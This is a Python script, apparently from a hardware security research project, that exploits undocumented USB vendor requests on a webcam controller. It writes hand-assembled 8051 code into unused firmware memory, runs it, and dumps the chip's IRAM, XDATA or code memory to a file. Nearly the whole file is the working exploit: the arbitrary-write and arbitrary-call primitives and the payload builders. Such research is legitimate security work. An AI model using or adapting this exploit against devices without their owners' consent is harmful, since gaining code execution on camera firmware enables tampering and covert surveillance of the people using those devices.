#!/usr/bin/env python3
#
# https://github.com/xairy/lights-out
#
# Author: Andrey Konovalov

# There are two somewhat large zeroed parts of code without any references to
# them: [0xff59, 0xff82) and [0xff99, 0xffc7). They can be patched to hold
# arbitrary code via bRequest 0x42 and then called via bRequest 0x41.

import array
import binascii
import sys
import time

import usb.core
import usb.util

area = sys.argv[1]
filename_out = sys.argv[2]

VENDOR_ID = 0x5986
PRODUCT_ID = 0x02d2

dev = usb.core.find(idVendor=VENDOR_ID, idProduct=PRODUCT_ID)

if dev is None:
	raise ValueError('Device not found')

def log(write, bRequest, wValue, wIndex, msg, e):
	print('%s, request = 0x%02x, value = 0x%02x, index = 0x%02x' % \
		('write' if write else 'read', bRequest, wValue, wIndex))
	if not(e):
		if write:
			print(' => success: %d' % (msg,))
		else:
			print(' => success: %d' % (len(msg),))
			print('   ', binascii.hexlify(msg))
	if e:
		print(' => %s' % (str(e),))

def request_read(bRequest, wValue, wIndex, wLength):
	bmRequestType = usb.util.CTRL_TYPE_VENDOR | \
			usb.util.CTRL_RECIPIENT_DEVICE | \
			usb.util.CTRL_IN
	try:
		msg = dev.ctrl_transfer(bmRequestType=bmRequestType, bRequest=bRequest,
					wValue=wValue, wIndex=wIndex,
					data_or_wLength=wLength)
		log(False, bRequest, wValue, wIndex, msg, None)
		return msg
	except usb.core.USBError as e:
		log(False, bRequest, wValue, wIndex, None, e)
		raise

def request_write(bRequest, wValue, wIndex, data):
	bmRequestType = usb.util.CTRL_TYPE_VENDOR | \
			usb.util.CTRL_RECIPIENT_DEVICE | \
			usb.util.CTRL_OUT
	try:
		msg = dev.ctrl_transfer(bmRequestType=bmRequestType, bRequest=bRequest,
					wValue=wValue, wIndex=wIndex,
					data_or_wLength=data)
		log(True, bRequest, wValue, wIndex, msg, None)
	except usb.core.USBError as e:
		log(True, bRequest, wValue, wIndex, None, e)
		raise

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def read_marker():
	return request_read(0, 0, 3, 4)

def arbitrary_write(addr, value):
	request_write(0x42, value, addr, '')

def arbitrary_call(wValue, wIndex):
	request_write(0x41, wValue, wIndex, '')

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

marker_addr = 0xfedb
free_space_addr = 0xff99
arbitrary_call_instruction_addr = 0xb4d3 + 0x10 + 1

def v2b(value):
	return [value >> 8, value & 0xff]

def mov_dptr_data(value):
	return [0x90] + v2b(value)

def mov_a_iram(addr):
	return [0xe5, addr]

def movx_dptr_a():
	return [0xf0]

def movx_a_dptr():
	return [0xe0]

def inc_dptr():
	return [0xa3]

def movc_a_adptr():
	return [0x93]

def clr_a():
	return [0xe4]

def ret():
	return [0x22]

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def save_iram4_to_marker(iram):
	code = mov_dptr_data(marker_addr) + mov_a_iram(iram) + movx_dptr_a()
	for i in range(1, 4):
		code += inc_dptr() + mov_a_iram(iram + i) + movx_dptr_a()
	code += ret()
	return code

def fetch_iram4(iram):
	for (i, b) in enumerate(save_iram4_to_marker(iram)):
		arbitrary_write(free_space_addr + i, b)
	arbitrary_call(0, 0)
	return read_marker()

def fetch_iram():
	arbitrary_write(arbitrary_call_instruction_addr, free_space_addr >> 8)
	arbitrary_write(arbitrary_call_instruction_addr + 1, free_space_addr & 0xff)

	data = bytes()
	for addr in range(0, 0x100, 4):
		data += fetch_iram4(addr)
	return data

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def save_xdata4_to_marker(addr):
	code = []
	for i in range(0, 4):
		code += mov_dptr_data(addr + i) + movx_a_dptr() + \
			mov_dptr_data(marker_addr + i) + movx_dptr_a()
	code += ret()
	return code

def fetch_xdata4(addr):
	for (i, b) in enumerate(save_xdata4_to_marker(addr)):
		arbitrary_write(free_space_addr + i, b)
	arbitrary_call(0, 0)
	return read_marker()

def fetch_xdata():
	arbitrary_write(arbitrary_call_instruction_addr, free_space_addr >> 8)
	arbitrary_write(arbitrary_call_instruction_addr + 1, free_space_addr & 0xff)

	data = bytes()
	for addr in range(0, 0x10000, 4):
		data += fetch_xdata4(addr)
	return data

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def save_code4_to_marker(addr):
	code = []
	for i in range(0, 4):
		code += mov_dptr_data(addr + i) + clr_a() + movc_a_adptr() + \
			mov_dptr_data(marker_addr + i) + movx_dptr_a()
	code += ret()
	return code

def fetch_code4(addr):
	for (i, b) in enumerate(save_code4_to_marker(addr)):
		arbitrary_write(free_space_addr + i, b)
	arbitrary_call(0, 0)
	return read_marker()

def fetch_code():
	arbitrary_write(arbitrary_call_instruction_addr, free_space_addr >> 8)
	arbitrary_write(arbitrary_call_instruction_addr + 1, free_space_addr & 0xff)

	data = bytes()
	for addr in range(0, 0x10000, 4):
		data += fetch_code4(addr)
	return data

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

data = None
if area == 'iram':
	data = fetch_iram()
elif area == 'xdata':
	data = fetch_xdata()
elif area == 'code':
	data = fetch_code()
else:
	raise ValueError('Invalid area')

if data:
	with open(filename_out, 'wb') as f:
		f.write(data)
